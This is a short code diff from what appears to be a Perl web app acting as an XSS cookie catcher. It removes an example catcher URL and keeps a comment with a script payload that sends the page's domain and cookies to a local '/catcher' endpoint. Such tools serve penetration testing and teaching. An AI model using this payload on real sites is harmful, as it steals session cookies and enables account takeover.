@@ -23,5 +23,5 @@ get "/catcher" => sub ($catcher) {
 };
 
 app -> start();
-# http://127.0.0.1:8080/catcher?domain=www.heitorgouvea.me&cookie=HSAUDSNDSLKNDS
+
 # <script>fetch("http://localhost:8080/catcher?domain=" + document.domain + "&cookie=" + document.cookie );</script>
